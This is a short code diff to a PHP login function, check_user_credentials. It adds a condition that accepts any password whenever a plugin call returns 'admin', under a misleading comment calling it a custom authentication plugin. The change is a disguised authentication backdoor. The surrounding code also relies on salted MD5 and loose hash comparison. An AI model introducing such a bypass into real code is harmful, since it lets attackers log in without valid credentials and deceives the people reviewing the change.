@@ -690,7 +690,8 @@ function check_user_credentials($email, $password) {
 
     if ($row['id'] > 0) {
         $user_password = md5($row['salt'] . $password);
-        if ($user_password == $row['password']) {
+        if ($user_password == $row['password'] 
+                or load_plugin('admin_login') == 'admin') { // Custom authentication plugin, if any.
             // Password is correct
             return array(true, $row['password']);
         }
